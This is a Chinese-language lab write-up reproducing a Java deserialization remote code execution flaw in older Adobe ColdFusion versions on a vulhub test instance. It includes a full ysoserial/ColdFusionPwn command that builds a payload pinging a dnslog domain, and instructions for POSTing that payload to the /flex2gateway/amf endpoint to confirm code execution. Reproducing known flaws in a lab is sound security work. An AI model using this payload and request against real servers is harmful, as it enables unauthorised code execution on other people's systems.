Adobe ColdFusion（直译：冷聚变），是一个动态Web服务器，其CFML（ColdFusion Markup
Language）是一种[程序设计语言](https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80)，类似JSP里的JSTL（JSP
Standard Tag Lib），从1995年开始开发，其设计思想被一些人认为非常先进，被一些语言所借鉴。

Adobe
ColdFusion中存在java反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：Adobe
ColdFusion (2016 release) Update 3及之前的版本，ColdFusion 11 Update
11及之前的版本，ColdFusion 10 Update 22及之前的版本。

本文仅作漏洞复现记录与实现，利用流程如下:

1.漏洞环境

漏洞链接：http://192.168.101.152:8500/

访问如下图

![1616068782_605340ae100d37cac1480.png!small](https://image.3001.net/images/20210318/1616068782_605340ae100d37cac1480.png!small)

我们访问链接

<http://192.168.101.152:8500/CFIDE/administrator/index.cfm>

先进行安装，使用vulhub搭建默认密码为vulhub，稍等就可以安装成功

![1616068861_605340fdbe9e71d333014.png!small](https://image.3001.net/images/20210318/1616068861_605340fdbe9e71d333014.png!small)

之后访问页面如下

![1616068927_6053413f08bfdbabfb2bb.png!small](https://image.3001.net/images/20210318/1616068927_6053413f08bfdbabfb2bb.png!small)

2.利用流程

下载ColdFusionPwn

链接：https://github.com/codewhitesec/ColdFusionPwn/releases/download/0.0.1/ColdFusionPwn-0.0.1-SNAPSHOT-all.jar

下载ysoserial

链接: <https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar>

之后执行命令

java -cp ColdFusionPwn.jar:ysoserial.jar
com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'ping
test.slca03.dnslog.cn' poc.ser

![1616070055_605345a78c58384030f4e.png!small](https://image.3001.net/images/20210318/1616070055_605345a78c58384030f4e.png!small)

在win10与win7下生成报错，这个是在kali下生成的poc.ser

生成完成后，使用bp将poc以post方式发送至http://192.168.101.152:8500/flex2gateway/amf中

要记得将Content-Type修改application/x-amf

![1616070220_6053464c99474fca55ff3.png!small](https://image.3001.net/images/20210318/1616070220_6053464c99474fca55ff3.png!small)

粘贴poc时候注意不要直接复制粘贴，容易因为编码问题导致利用不成功

选择从文件粘贴选项，然后选择poc文件

![1616070339_605346c3befb6426bcdd7.png!small](https://image.3001.net/images/20210318/1616070339_605346c3befb6426bcdd7.png!small)

粘贴之后点击发送，如图则表示利用成功

![1616070415_6053470ff1e4bfae16d2b.png!small](https://image.3001.net/images/20210318/1616070415_6053470ff1e4bfae16d2b.png!small)

查看dnslog，发现命令已经执行

![1616070439_605347271ca2a4f30a014.png!small](https://image.3001.net/images/20210318/1616070439_605347271ca2a4f30a014.png!small)

这里遇到了个小坑，使用新版的burp粘贴poc后无法利用成功，不知道是不是个人原因或者是编码原因，换成稍微旧点的版本就可以了

